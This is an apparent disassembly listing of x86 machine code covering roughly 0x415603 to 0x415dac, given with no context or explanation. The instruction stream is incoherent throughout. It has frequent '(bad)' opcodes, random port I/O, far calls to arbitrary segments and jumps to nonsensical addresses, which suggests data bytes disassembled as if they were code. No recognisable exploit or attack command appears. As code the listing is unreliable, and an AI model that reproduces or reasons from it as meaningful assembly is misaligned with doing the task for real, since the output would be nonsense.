  415603:	pop    ebp
  415604:	lds    edx,FWORD PTR [ecx-0x7c8f0138]
  41560a:	push   ds
  41560b:	mov    es,WORD PTR [esp+eax*1-0x767dcc48]
  415612:	xchg   ah,dh
  415614:	retw   
  415616:	pop    ebp
  415617:	hlt    
  415618:	mov    bl,0x43
  41561a:	data16 and al,0xbe
  41561d:	dec    eax
  41561e:	enter  0xa6f1,0x6a
  415622:	dec    eax
  415623:	jmp    0x65b6b931
  415628:	inc    edi
  415629:	leave  
  41562a:	bound  ecx,QWORD PTR [edx-0x255b7814]
  415630:	daa    
  415631:	adc    BYTE PTR [ecx+edi*4],dl
  415634:	mov    al,0x0
  415636:	jmp    0x415695
  415638:	out    0xd1,al
  41563a:	adc    DWORD PTR [edx-0x31ab9089],edx
  415640:	jg     0x415638
  415642:	ins    DWORD PTR es:[edi],dx
  415643:	das    
  415644:	sbb    ah,bl
  415646:	pushf  
  415647:	xchg   DWORD PTR [eax+0x8],ebp
  41564a:	xor    DWORD PTR [esi+0x21],0xffffff8b
  41564e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41564f:	repnz and eax,DWORD PTR [ecx*2-0x9d79fb1]
  415657:	mov    ebp,0x6430eacf
  41565c:	das    
  41565d:	pop    eax
  41565e:	scas   al,BYTE PTR es:[edi]
  41565f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415660:	arpl   WORD PTR [eax+0x367ef832],sp
  415666:	mov    dh,BYTE PTR [ecx-0x6c]
  415669:	xchg   edx,eax
  41566a:	xchg   BYTE PTR [edi-0x8],dh
  41566d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41566e:	int    0xc8
  415670:	mov    eax,ds:0xb03f7674
  415675:	das    
  415676:	int3   
  415677:	mov    ebp,0x9ad13b43
  41567c:	mov    ds:0x730834b9,al
  415681:	cmp    eax,DWORD PTR [ecx+0x2e]
  415684:	pop    ecx
  415685:	mov    ds:0x91a73d0b,al
  41568a:	push   0x4
  41568c:	shr    DWORD PTR [ebp+ecx*1+0x37a5e4e1],0xd4
  415694:	inc    ebp
  415695:	push   edi
  415696:	aam    0x55
  415698:	(bad)  
  415699:	dec    ebp
  41569a:	jp     0x415646
  41569c:	test   BYTE PTR [ebx-0x29],ch
  41569f:	mov    ah,0xa0
  4156a1:	addr16 test al,0xcd
  4156a4:	rcr    bl,cl
  4156a6:	adc    BYTE PTR [ecx+0x184e16dd],cl
  4156ac:	cs out dx,al
  4156ae:	jbe    0x415657
  4156b0:	cmp    BYTE PTR [edi+0x7708813],dl
  4156b6:	xchg   ch,bl
  4156b8:	push   0xffffffe9
  4156ba:	retf   
  4156bb:	add    ah,BYTE PTR [ecx]
  4156bd:	xor    eax,0xa4e73d61
  4156c2:	dec    esp
  4156c3:	out    0xd0,al
  4156c5:	jne    0x4156ec
  4156c7:	jmp    0x4156e6
  4156c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ca:	sub    esp,0xac8ceb56
  4156d0:	rcr    DWORD PTR [eax+eax*1+0x5040372a],0x5
  4156d8:	mov    cl,0xc8
  4156da:	data16 xchg BYTE PTR [edi+0x665b2585],bl
  4156e1:	mov    WORD PTR [ecx],?
  4156e3:	test   al,0x1
  4156e5:	lods   eax,DWORD PTR ds:[esi]
  4156e6:	out    0xef,eax
  4156e8:	and    ah,BYTE PTR [ecx-0x73cdffb3]
  4156ee:	adc    DWORD PTR [edi+0x76],0x34
  4156f2:	(bad)  
  4156f3:	ror    al,cl
  4156f5:	jp     0x4156b9
  4156f7:	sbb    eax,0x953b6ebe
  4156fc:	fidiv  WORD PTR [edx+ebp*8-0x7296cab4]
  415703:	retf   0xa430
  415706:	xor    eax,0xd37382e4
  41570b:	clc    
  41570c:	sti    
  41570d:	aad    0x2c
  41570f:	shl    BYTE PTR [edi-0x56],0xdc
  415713:	lock test BYTE PTR [ebp-0x4e],ah
  415717:	mov    bl,0x2c
  415719:	sub    DWORD PTR ss:[esi+ebx*4],0xfffffffe
  41571e:	jne    0x415781
  415720:	xlat   BYTE PTR ds:[ebx]
  415721:	xor    eax,0xd3218f0b
  415726:	push   0xb0efab0f
  41572b:	sbb    BYTE PTR [edx],bh
  41572d:	lods   al,BYTE PTR ds:[esi]
  41572e:	shl    DWORD PTR [edi-0x95d9711],cl
  415734:	scas   eax,DWORD PTR es:[edi]
  415735:	mov    esi,0x98789c2a
  41573a:	aas    
  41573b:	(bad)  
  41573c:	test   al,0x74
  41573e:	inc    ebx
  41573f:	(bad)  
  415740:	je     0x415797
  415742:	cmp    esp,DWORD PTR [ecx+ebx*2]
  415745:	dec    BYTE PTR [edi]
  415747:	sahf   
  415748:	pop    ss
  415749:	mov    BYTE PTR [ecx+ecx*8-0x75b2668c],bh
  415750:	sbb    ebp,DWORD PTR [esi]
  415752:	mov    es,WORD PTR [edi]
  415754:	loopne 0x4156e7
  415756:	mov    eax,ds:0x43e98f9b
  41575b:	adc    DWORD PTR [ebp-0x65],0xffffffdb
  41575f:	add    eax,0x3907e143
  415764:	jno    0x41572b
  415766:	xor    BYTE PTR [ebp+0x2c7957fa],bh
  41576c:	ret    
  41576d:	imul   BYTE PTR [eax]
  41576f:	sub    BYTE PTR [ebx+0x3d],dh
  415772:	mov    edi,0x5feb62be
  415777:	mov    WORD PTR [edx],es
  415779:	gs xchg edi,eax
  41577b:	xchg   edi,eax
  41577c:	gs sbb eax,0xdf6e9d6
  415782:	jmp    0x3a88ab91
  415787:	mul    DWORD PTR [edx]
  415789:	push   cs
  41578a:	xor    BYTE PTR [esi],al
  41578c:	in     al,0xc8
  41578e:	test   BYTE PTR [ecx],al
  415790:	pop    ecx
  415791:	pop    edi
  415792:	call   DWORD PTR [edx-0x3e]
  415795:	aaa    
  415796:	jp     0x415726
  415798:	test   al,0x22
  41579a:	push   cs
  41579b:	(bad)  
  41579c:	sti    
  41579d:	xchg   ecx,eax
  41579e:	or     eax,0x45c07050
  4157a3:	dec    ebp
  4157a4:	add    DWORD PTR [esi],edi
  4157a6:	mov    edx,0xec4a200f
  4157ab:	data16 fs hlt 
  4157ae:	mov    ebp,0xdba09e70
  4157b3:	test   DWORD PTR [ebx-0x314da170],ecx
  4157b9:	xor    al,0xc1
  4157bb:	aam    0xeb
  4157bd:	sbb    ebx,esp
  4157bf:	xor    DWORD PTR [ebx+0x7f8af6a2],edx
  4157c5:	jmp    0x4157ca
  4157c7:	pusha  
  4157c8:	jo     0x415766
  4157ca:	ficomp DWORD PTR [eax+esi*4+0x50635b0a]
  4157d1:	cmp    ch,BYTE PTR ds:0xa6742fd5
  4157d7:	lahf   
  4157d8:	mov    eax,ds:0xbfeb5717
  4157dd:	xlat   BYTE PTR ds:[ebx]
  4157de:	xor    DWORD PTR [ecx],ebp
  4157e0:	scas   al,BYTE PTR es:[edi]
  4157e1:	call   eax
  4157e3:	stc    
  4157e4:	fcomi  st,st(6)
  4157e6:	mov    esp,0xddfdd5f3
  4157eb:	aas    
  4157ec:	bound  eax,QWORD PTR [edx+0x74]
  4157ef:	les    edi,FWORD PTR [ebx+0x1b]
  4157f2:	inc    eax
  4157f3:	(bad)  
  4157f4:	sar    ebp,1
  4157f6:	jae    0x41581c
  4157f8:	aad    0x82
  4157fa:	test   DWORD PTR [edi],eax
  4157fc:	pop    ds
  4157fd:	aam    0x12
  4157ff:	leave  
  415800:	bound  esp,QWORD PTR [esi-0x34]
  415803:	ja     0x415838
  415805:	mov    gs,WORD PTR [edi-0x6f]
  415808:	outs   dx,DWORD PTR ds:[esi]
  415809:	cmp    al,BYTE PTR [eax-0x34147bae]
  41580f:	jle    0x4157d1
  415811:	retf   
  415812:	jl     0x415887
  415814:	xchg   ebp,eax
  415815:	or     esi,esi
  415817:	xor    dl,bh
  415819:	or     al,0x7d
  41581b:	scas   al,BYTE PTR es:[edi]
  41581c:	mov    ah,ah
  41581e:	test   al,0x7f
  415820:	mov    al,0x52
  415822:	dec    ebx
  415823:	lock pop ecx
  415825:	jnp    0x41581e
  415827:	int3   
  415828:	ds xchg edx,eax
  41582a:	bound  ebp,QWORD PTR [edi-0x6]
  41582d:	add    eax,0x7b126f4c
  415832:	std    
  415833:	ins    BYTE PTR es:[edi],dx
  415834:	add    eax,0xc8e72f40
  415839:	lahf   
  41583a:	ficomp WORD PTR [ecx-0x6b]
  41583d:	pop    edx
  41583e:	add    al,0x7e
  415840:	mov    ch,BYTE PTR [eax-0x3d]
  415843:	cwde   
  415844:	popa   
  415845:	mov    al,0x88
  415847:	dec    esi
  415848:	jge    0x415857
  41584a:	add    eax,0xc1b55224
  41584f:	mov    edi,fs
  415851:	mov    cl,0x26
  415853:	inc    ebp
  415854:	push   0xdfc4da7a
  415859:	push   ecx
  41585a:	mov    ebp,0x11871f99
  41585f:	xor    eax,0xc70dddb6
  415864:	push   ecx
  415865:	(bad)  
  415866:	mov    cl,0x3b
  415868:	loopne 0x4157fb
  41586a:	popa   
  41586b:	rcl    esi,0x80
  41586e:	(bad)  
  41586f:	in     al,dx
  415870:	ret    
  415871:	outs   dx,DWORD PTR ds:[esi]
  415872:	cmp    dh,cl
  415874:	leave  
  415875:	push   es
  415876:	push   ebx
  415877:	adc    DWORD PTR [edx+0x479fff9b],ebx
  41587d:	daa    
  41587e:	ficom  DWORD PTR [ebp+0x45]
  415881:	xadd   BYTE PTR [edi-0x45],bl
  415885:	mov    ecx,0x8e561552
  41588a:	out    0x54,eax
  41588c:	(bad)  
  41588e:	ret    0x78f6
  415891:	repz in al,dx
  415893:	rcl    BYTE PTR [edx],0xa4
  415896:	jb     0x41588b
  415898:	push   eax
  415899:	add    esi,DWORD PTR [edi-0x20]
  41589c:	mov    edi,0xb1d4b72
  4158a1:	push   edx
  4158a2:	xchg   ecx,eax
  4158a3:	mov    DWORD PTR [edi-0x3c],edi
  4158a6:	mov    esp,0xce07b236
  4158ab:	cmp    BYTE PTR [ebx+eiz*8],0xd6
  4158af:	(bad)  
  4158b0:	cwde   
  4158b1:	dec    ebp
  4158b2:	enter  0xfb7f,0xee
  4158b6:	sti    
  4158b7:	jl     0x415916
  4158b9:	iret   
  4158ba:	out    0xd7,al
  4158bc:	pop    esi
  4158bd:	aad    0x4f
  4158bf:	pop    ecx
  4158c0:	or     edx,DWORD PTR [ebx]
  4158c2:	adc    al,0x4e
  4158c4:	test   eax,0x8923220c
  4158c9:	and    eax,0x50f53f6b
  4158ce:	mov    ch,0xde
  4158d0:	push   eax
  4158d1:	fwait
  4158d2:	xor    eax,0xb95cd2e8
  4158d7:	shr    DWORD PTR [ebx+0x67],cl
  4158da:	inc    ebp
  4158db:	test   ecx,esi
  4158dd:	jne    0x415954
  4158df:	aas    
  4158e0:	adc    ah,bl
  4158e2:	in     al,0x33
  4158e4:	call   0x24:0x9a57c74b
  4158eb:	xor    al,0x16
  4158ed:	fwait
  4158ee:	pop    ebp
  4158ef:	pop    ecx
  4158f0:	xchg   esp,eax
  4158f1:	adc    DWORD PTR [edi-0x63],edx
  4158f4:	call   0xd32f171c
  4158f9:	jecxz  0x415971
  4158fb:	loope  0x4158c5
  4158fd:	(bad)  
  4158fe:	cmc    
  4158ff:	(bad)  
  415900:	and    cl,cl
  415902:	sub    al,0x84
  415904:	cmp    eax,0xcb8b46ed
  415909:	push   edi
  41590a:	test   al,0x17
  41590c:	cmp    BYTE PTR [ebp-0x73ecd057],dh
  415912:	ins    BYTE PTR es:[edi],dx
  415913:	cld    
  415914:	(bad)  
  415915:	and    eax,ebp
  415917:	int    0x42
  415919:	mov    eax,0x196c73e5
  41591e:	ror    ecx,1
  415920:	dec    edx
  415921:	jne    0x41597a
  415923:	sub    BYTE PTR [eax+0x14966b86],ah
  415929:	sahf   
  41592a:	and    bl,ch
  41592c:	push   edi
  41592d:	push   ebp
  41592e:	arpl   WORD PTR [edx],cx
  415930:	ret    0x8812
  415933:	xor    al,0xea
  415935:	adc    DWORD PTR [ebx],ebx
  415937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415938:	pand   mm3,mm7
  41593b:	stos   BYTE PTR es:[edi],al
  41593c:	jo     0x4159ac
  41593e:	in     al,dx
  41593f:	mov    bh,0xc2
  415941:	icebp  
  415942:	jno    0x4159c2
  415944:	adc    BYTE PTR [edi],al
  415946:	cmp    al,0xbf
  415948:	mov    eax,0x80150f25
  41594d:	dec    esi
  41594e:	lods   al,BYTE PTR ds:[esi]
  41594f:	outs   dx,BYTE PTR ds:[esi]
  415950:	or     eax,0x60c9faf2
  415955:	sbb    eax,0x112e707f
  41595a:	fadd   DWORD PTR [edx]
  41595c:	stos   DWORD PTR es:[edi],eax
  41595d:	jnp    0x415968
  41595f:	mov    bh,0x87
  415961:	inc    ebx
  415962:	test   DWORD PTR [ecx-0x7],edx
  415965:	pusha  
  415966:	mov    eax,ds:0xdacf1a78
  41596b:	jg     0x415997
  41596d:	ret    
  41596e:	int3   
  41596f:	jo     0x415978
  415971:	(bad)  
  415972:	je     0x4158f6
  415974:	jo     0x4159f0
  415976:	lds    edi,FWORD PTR [ecx-0x1d]
  415979:	imul   ebx,DWORD PTR [eax-0x16b7baa1],0x6a
  415980:	add    al,0xe8
  415982:	mov    bl,0xac
  415984:	int    0x59
  415986:	and    BYTE PTR gs:[edx],ah
  415989:	dec    edx
  41598a:	mov    ds:0xad2123c9,eax
  41598f:	cmp    eax,0x4ceb7027
  415994:	cmp    eax,0x2af04dc6
  415999:	arpl   bp,ax
  41599b:	aaa    
  41599c:	jae    0x415975
  41599e:	jle    0x415954
  4159a0:	test   BYTE PTR ds:0xffb523be,0x99
  4159a7:	out    dx,eax
  4159a8:	mov    ds:0x55c876c2,al
  4159ad:	cwde   
  4159ae:	les    edx,FWORD PTR [ebp-0x2e]
  4159b1:	push   eax
  4159b2:	call   0x8e476010
  4159b7:	(bad)  
  4159b8:	inc    esi
  4159b9:	fs xchg esi,eax
  4159bb:	adc    DWORD PTR [edx+ecx*1],edx
  4159be:	cmp    DWORD PTR [eax+0x5d2dcac7],esp
  4159c4:	(bad)  
  4159c5:	jge    0x415a3c
  4159c7:	mov    eax,ds:0xe0c33ab0
  4159cc:	adc    cl,BYTE PTR [esi+0x51]
  4159cf:	push   esp
  4159d0:	cmp    DWORD PTR [di-0x173b],ecx
  4159d5:	fwait
  4159d6:	lods   al,BYTE PTR ds:[esi]
  4159d7:	jbe    0x4159e6
  4159d9:	pop    ebp
  4159da:	xor    ecx,DWORD PTR [esi-0x7f]
  4159dd:	scas   eax,DWORD PTR es:[edi]
  4159de:	cmp    DWORD PTR [edi+0x4f713a8b],esp
  4159e4:	mov    DWORD PTR [ebx+0x73b1882f],esi
  4159ea:	aad    0x27
  4159ec:	ins    BYTE PTR es:[edi],dx
  4159ed:	mov    ds:0xbe55301,eax
  4159f2:	jge    0x415987
  4159f4:	arpl   WORD PTR [edx],ax
  4159f6:	ret    0xe89
  4159f9:	loop   0x4159b3
  4159fb:	adc    ah,BYTE PTR [ebp-0x5154a2ad]
  415a01:	add    al,0x36
  415a03:	cld    
  415a04:	int    0x81
  415a06:	rol    BYTE PTR [ecx-0x3179e6a9],0xd0
  415a0d:	add    ah,BYTE PTR [ebp-0x75a4f536]
  415a13:	data16 fiadd WORD PTR [ecx]
  415a16:	sub    al,0x33
  415a18:	mov    ds:0x9374c19,eax
  415a1d:	idiv   ecx
  415a1f:	out    0xf6,eax
  415a21:	cmc    
  415a22:	sahf   
  415a23:	jecxz  0x4159d5
  415a25:	mov    DWORD PTR [ecx],ecx
  415a27:	jp     0x415a52
  415a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a2a:	mul    DWORD PTR [eax+0x39]
  415a2d:	cmp    al,bh
  415a2f:	mov    ds:0xebf150f1,al
  415a34:	or     eax,0xa7743489
  415a39:	sub    eax,edi
  415a3b:	cmp    al,0x55
  415a3d:	call   0xbc2ff91e
  415a42:	cmp    ebp,esp
  415a44:	mov    ecx,0x64f064a6
  415a49:	mov    eax,ds:0xbd2eb5f1
  415a4e:	cmc    
  415a4f:	mov    cl,0x3
  415a51:	adc    eax,0x1af426eb
  415a56:	inc    ebp
  415a57:	fst    DWORD PTR [ebx+0x4a]
  415a5a:	(bad)  
  415a5c:	je     0x415a35
  415a5e:	add    al,0xc8
  415a60:	aaa    
  415a61:	add    al,BYTE PTR [edi+0x60f5a3b]
  415a67:	shl    DWORD PTR [eax],0x6a
  415a6a:	or     DWORD PTR [edi-0x66],ebp
  415a6d:	ret    
  415a6e:	lods   al,BYTE PTR ds:[esi]
  415a6f:	aaa    
  415a70:	push   ebx
  415a71:	je     0x415ab5
  415a73:	fidiv  DWORD PTR [ebx]
  415a75:	and    DWORD PTR [eax+0x13100db],0x8
  415a7c:	adc    BYTE PTR [edi-0x28],0x32
  415a80:	aaa    
  415a81:	push   esi
  415a82:	hlt    
  415a83:	mov    al,dl
  415a85:	pop    eax
  415a86:	(bad)  
  415a87:	mov    dl,0x8
  415a89:	pusha  
  415a8a:	es ja  0x415a51
  415a8d:	push   0xffffffe9
  415a8f:	add    ebx,DWORD PTR [ebx+ebx*2]
  415a92:	pop    ds
  415a93:	in     eax,dx
  415a94:	ins    DWORD PTR es:[edi],dx
  415a95:	addr16 jge 0x415a1c
  415a98:	dec    esi
  415a99:	dec    edi
  415a9a:	mov    dh,0xf6
  415a9c:	mov    eax,ds:0x40dce802
  415aa1:	or     BYTE PTR [edi-0x66],ch
  415aa4:	sub    dh,BYTE PTR gs:[ebp-0xd]
  415aa8:	fld    DWORD PTR [ebx]
  415aaa:	adc    al,BYTE PTR [edx-0x172dffc4]
  415ab0:	cmp    bl,BYTE PTR [edi-0x22]
  415ab3:	dec    edi
  415ab4:	mov    al,0xeb
  415ab6:	shl    BYTE PTR [esi],1
  415ab8:	cmp    ecx,ebp
  415aba:	push   0xfffffff9
  415abc:	imul   esi,DWORD PTR [ebp+0x22],0x283846b3
  415ac3:	inc    esp
  415ac4:	sub    BYTE PTR [eax+0x1a87f975],dh
  415aca:	cdq    
  415acb:	cmp    eax,0x81056b3d
  415ad0:	in     eax,0xfa
  415ad2:	adc    ecx,edi
  415ad4:	jle    0x415ac3
  415ad6:	into   
  415ad7:	int    0x91
  415ad9:	ficomp WORD PTR [edi+eax*2-0x7f49a2f0]
  415ae0:	test   ebx,ecx
  415ae2:	das    
  415ae3:	cmp    ebx,ecx
  415ae5:	adc    al,0x5e
  415ae7:	neg    DWORD PTR [esi+esi*8]
  415aea:	outs   dx,DWORD PTR ds:[esi]
  415aeb:	jle    0x415b10
  415aed:	mov    DWORD PTR [ebx+0x58],0xb11869a2
  415af4:	mov    ebx,0xa0622561
  415af9:	retf   
  415afa:	out    0xab,al
  415afc:	loope  0x415a8b
  415afe:	mov    DWORD PTR [eax],ecx
  415b00:	mov    bh,0x3d
  415b02:	cdq    
  415b03:	xchg   edi,eax
  415b04:	xchg   ecx,eax
  415b05:	ficom  DWORD PTR [ebx+0x76]
  415b08:	jbe    0x415ae6
  415b0a:	jbe    0x415b28
  415b0c:	adc    al,0xf9
  415b0e:	adc    DWORD PTR [eax],eax
  415b10:	jae    0x415b25
  415b12:	shl    BYTE PTR [edi-0x40],cl
  415b15:	dec    esp
  415b16:	(bad)  
  415b17:	into   
  415b18:	loopne 0x415b66
  415b1a:	push   eax
  415b1b:	mov    al,ds:0xcbcde397
  415b20:	and    dh,bl
  415b22:	sbb    al,0xef
  415b24:	icebp  
  415b25:	in     al,0x93
  415b27:	dec    ebx
  415b28:	adc    ah,BYTE PTR ds:0xb0c7e193
  415b2e:	stc    
  415b2f:	or     BYTE PTR ds:0xf215aa2a,ah
  415b35:	lods   al,BYTE PTR ds:[esi]
  415b36:	jo     0x415b6c
  415b38:	leave  
  415b39:	mov    ebp,0xff782a43
  415b3e:	and    edi,DWORD PTR [ebx+0xa74778d]
  415b44:	call   0x2500:0x7f43b03a
  415b4b:	mov    ecx,0x9ecc40c
  415b50:	jae    0x415bcf
  415b52:	ins    BYTE PTR es:[edi],dx
  415b53:	es fucom st(1)
  415b56:	xlat   BYTE PTR ds:[ebx]
  415b57:	ins    DWORD PTR es:[edi],dx
  415b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b59:	adc    al,0xb
  415b5b:	fst    DWORD PTR [ebx+0x6f]
  415b5e:	stos   BYTE PTR es:[edi],al
  415b5f:	sbb    al,0x57
  415b61:	push   edx
  415b62:	pop    ss
  415b63:	mov    bl,0x8d
  415b65:	ds xchg esp,eax
  415b67:	sbb    al,0xfa
  415b69:	dec    ecx
  415b6a:	push   0x18
  415b6c:	(bad)  
  415b6d:	pop    edi
  415b6e:	cmp    DWORD PTR [ecx+0x6d],ebp
  415b71:	mov    ebx,DWORD PTR [ecx-0x67]
  415b74:	nop
  415b75:	call   0x5849:0x921a65e3
  415b7c:	mov    dl,0xcf
  415b7e:	add    BYTE PTR [eax],ah
  415b80:	adc    al,0x58
  415b82:	jmp    0x415bce
  415b84:	or     DWORD PTR [ebx],edi
  415b86:	jns    0x415bbe
  415b88:	jne    0x415c01
  415b8a:	sbb    BYTE PTR [edx+0x5c],0xd9
  415b8e:	push   esi
  415b8f:	push   0x841532f1
  415b94:	ja     0x415bb4
  415b96:	jecxz  0x415b7e
  415b98:	and    al,0x3c
  415b9a:	inc    ebp
  415b9b:	sbb    BYTE PTR [ebx+0x727e463],0x69
  415ba2:	sbb    ebx,eax
  415ba4:	xchg   edi,eax
  415ba5:	mov    bh,0x89
  415ba7:	loopne 0x415ba0
  415ba9:	outs   dx,BYTE PTR ds:[esi]
  415baa:	push   esp
  415bab:	popa   
  415bac:	xor    bl,BYTE PTR [ecx-0x73]
  415baf:	sub    DWORD PTR [ebp+0x7b],ebp
  415bb2:	dec    esi
  415bb3:	dec    eax
  415bb4:	mov    bl,0x98
  415bb6:	lahf   
  415bb7:	cwde   
  415bb8:	inc    edx
  415bb9:	sub    BYTE PTR [eax-0x31b54907],0xb7
  415bc0:	pop    edi
  415bc1:	fwait
  415bc2:	shl    edx,cl
  415bc4:	(bad)  
  415bc5:	xchg   esi,eax
  415bc6:	sbb    eax,0x54845300
  415bcb:	cdq    
  415bcc:	pusha  
  415bcd:	loope  0x415bac
  415bcf:	sar    BYTE PTR [edi+0x75fc3ab5],0x16
  415bd6:	sub    bl,dh
  415bd8:	pop    esi
  415bd9:	jnp    0x415b74
  415bdb:	dec    edi
  415bdc:	div    BYTE PTR [ecx+edi*2]
  415bdf:	arpl   WORD PTR ds:[edx+edx*1+0x4636f91d],cx
  415be7:	xchg   ebx,ebp
  415be9:	jns    0x415c3d
  415beb:	mov    DWORD PTR [ecx+0x46185239],0xa905e342
  415bf5:	pop    esp
  415bf6:	loop   0x415baa
  415bf8:	stos   BYTE PTR es:[edi],al
  415bf9:	push   ecx
  415bfa:	out    0xb,eax
  415bfc:	fs inc ebx
  415bfe:	or     BYTE PTR [esi+0x73],bl
  415c01:	add    al,0x75
  415c03:	jecxz  0x415b9b
  415c05:	fwait
  415c06:	scas   al,BYTE PTR es:[edi]
  415c07:	aad    0x38
  415c09:	addr16 mov bl,0x8e
  415c0c:	dec    ebx
  415c0d:	ss add eax,0x3e2277ac
  415c13:	and    cl,BYTE PTR ds:0x487bc0d3
  415c19:	sbb    bh,BYTE PTR [ebx+0x4]
  415c1c:	std    
  415c1d:	das    
  415c1e:	sub    edx,edx
  415c20:	std    
  415c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c22:	retf   0x78c9
  415c25:	ins    BYTE PTR es:[edi],dx
  415c26:	cmp    ebx,DWORD PTR [ebx+0x4f]
  415c29:	pop    ebx
  415c2a:	icebp  
  415c2b:	pop    ds
  415c2c:	sub    ebp,DWORD PTR [esi-0x6b50043b]
  415c32:	xor    DWORD PTR [ebp-0x32c3797a],0x28
  415c39:	cmp    esp,edx
  415c3b:	xchg   BYTE PTR [edx-0x2c],dh
  415c3e:	mov    dh,0x8
  415c40:	ins    BYTE PTR es:[edi],dx
  415c41:	add    dl,BYTE PTR [edx+0x15b0ef70]
  415c47:	jecxz  0x415bf3
  415c49:	mov    al,0x57
  415c4b:	fdivr  DWORD PTR [esi]
  415c4d:	cmp    al,0x63
  415c4f:	(bad)  
  415c50:	dec    edi
  415c51:	add    DWORD PTR [eax],edx
  415c53:	cmp    DWORD PTR [edx+0x57416670],esi
  415c59:	add    ebp,DWORD PTR [ebx]
  415c5b:	mov    ch,0x69
  415c5d:	xor    bl,BYTE PTR [eax+0x4d]
  415c60:	(bad)  [ecx-0x56]
  415c63:	inc    ecx
  415c64:	push   edx
  415c65:	mov    esi,0xbb5d664
  415c6a:	dec    ebp
  415c6b:	sub    al,0xe9
  415c6d:	xor    cl,BYTE PTR [edx-0x746ad2d8]
  415c73:	mov    al,0x5b
  415c75:	jl     0x415c4f
  415c77:	mov    bl,bh
  415c79:	std    
  415c7a:	loop   0x415c09
  415c7c:	dec    ecx
  415c7d:	data16 adc al,0x7
  415c80:	mov    ds:0xc64a9fe8,al
  415c85:	sub    DWORD PTR [ebx+0x53],ecx
  415c88:	mov    eax,DWORD PTR [ebx-0x68]
  415c8b:	daa    
  415c8c:	add    DWORD PTR [esi+0x574e5ca4],ebp
  415c92:	dec    esp
  415c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c94:	test   eax,0x4db3b9b0
  415c99:	and    eax,0x4f30f0fe
  415c9e:	xor    dl,BYTE PTR [edi]
  415ca0:	adc    esi,esp
  415ca2:	jge    0x415c85
  415ca4:	pop    ebp
  415ca5:	or     BYTE PTR [ecx-0x7cdb5109],dl
  415cab:	scas   al,BYTE PTR es:[edi]
  415cac:	fcom   QWORD PTR [esi-0x40]
  415caf:	inc    ebp
  415cb0:	retf   0xc960
  415cb3:	rcr    BYTE PTR [eax+0x30],1
  415cb6:	lods   al,BYTE PTR ds:[esi]
  415cb7:	and    esi,DWORD PTR [edi+0x112bae03]
  415cbd:	cmp    eax,0xcdbf5e8f
  415cc2:	jae    0x415d01
  415cc4:	jecxz  0x415ce6
  415cc6:	xor    al,0xc1
  415cc8:	ins    DWORD PTR es:[edi],dx
  415cc9:	xchg   ebp,eax
  415cca:	sahf   
  415ccb:	call   0xb5dfdb1c
  415cd0:	sar    DWORD PTR [eax-0x33],cl
  415cd3:	or     eax,0x31f1156a
  415cd8:	xchg   ebp,edx
  415cda:	rcr    esp,0x80
  415cdd:	xchg   DWORD PTR [eax-0x1f],edx
  415ce0:	and    BYTE PTR [esi],al
  415ce2:	sub    esp,DWORD PTR [ecx]
  415ce4:	dec    edi
  415ce5:	les    sp,DWORD PTR [esi-0x13fc3aec]
  415cec:	test   al,0xf7
  415cee:	rcr    BYTE PTR [edx-0x47],0x36
  415cf2:	pop    edi
  415cf3:	pop    eax
  415cf4:	push   ss
  415cf5:	scas   al,BYTE PTR es:[edi]
  415cf6:	or     al,0xb6
  415cf8:	gs or  ebp,esi
  415cfb:	cmp    ch,BYTE PTR [ebp+0x33]
  415cfe:	xlat   BYTE PTR ds:[ebx]
  415cff:	jne    0x415ca1
  415d01:	inc    ecx
  415d02:	int3   
  415d03:	test   al,0xd
  415d05:	out    0x86,al
  415d07:	mov    cl,0x8d
  415d09:	push   ss
  415d0a:	addr16 push eax
  415d0c:	test   BYTE PTR [eax+0x127305ed],bl
  415d12:	shr    BYTE PTR [edi],cl
  415d14:	pop    ebp
  415d15:	push   0x6b94616b
  415d1a:	add    bh,BYTE PTR [ecx-0x10]
  415d1d:	pop    ds
  415d1e:	test   DWORD PTR [eax-0x10],0x9b10357a
  415d25:	test   eax,0x3944d51
  415d2a:	stc    
  415d2b:	mov    cl,0x28
  415d2d:	cmp    esp,DWORD PTR [eax]
  415d2f:	clc    
  415d30:	dec    ecx
  415d31:	and    BYTE PTR [edx],dl
  415d33:	or     BYTE PTR gs:[eax+eiz*2+0x0],0xc3
  415d39:	xor    edx,esp
  415d3b:	addr16 dec edi
  415d3d:	in     eax,dx
  415d3e:	mov    al,0xbf
  415d40:	arpl   WORD PTR [edi+0x55196906],cx
  415d46:	push   ebp
  415d47:	(bad)
  415d4a:	mov    bh,0xe0
  415d4c:	shl    cl,0x87
  415d4f:	add    BYTE PTR [edi],cl
  415d51:	retf   
  415d52:	loope  0x415d75
  415d54:	clc    
  415d55:	int3   
  415d56:	daa    
  415d57:	adc    eax,0xcf31c8cf
  415d5c:	mov    al,0x4c
  415d5e:	and    DWORD PTR [ebx-0x12c368a7],eax
  415d64:	shl    BYTE PTR [edi],0x78
  415d67:	in     al,0x46
  415d69:	js     0x415d36
  415d6b:	push   ds
  415d6c:	int    0xb2
  415d6e:	add    eax,0x974c79c8
  415d73:	xchg   ecx,eax
  415d74:	cmp    BYTE PTR [ebp+ebx*4+0x37],cl
  415d78:	pushf  
  415d79:	pop    DWORD PTR [esi-0x784bbad0]
  415d7f:	icebp  
  415d80:	rcl    DWORD PTR [edx],cl
  415d82:	stos   DWORD PTR es:[edi],eax
  415d83:	mov    edx,0x80ce48d6
  415d88:	stos   BYTE PTR es:[edi],al
  415d89:	repnz aam 0xb9
  415d8c:	cmc    
  415d8d:	cmp    al,0x79
  415d8f:	outs   dx,DWORD PTR ds:[esi]
  415d90:	inc    ebp
  415d91:	(bad)  
  415d92:	dec    esp
  415d93:	sahf   
  415d94:	push   eax
  415d95:	sub    al,ch
  415d97:	outs   dx,BYTE PTR ds:[esi]
  415d98:	cmp    esi,edi
  415d9a:	push   ebp
  415d9b:	lods   eax,DWORD PTR ds:[esi]
  415d9c:	or     eax,DWORD PTR [eax+0x1c]
  415d9f:	imul   ebp,edx,0xffffffb7
  415da2:	test   eax,0x9f17d8c
  415da7:	and    eax,0xa01382f7
  415dac:	rcr    BYTE PTR [ecx+edi*1],cl
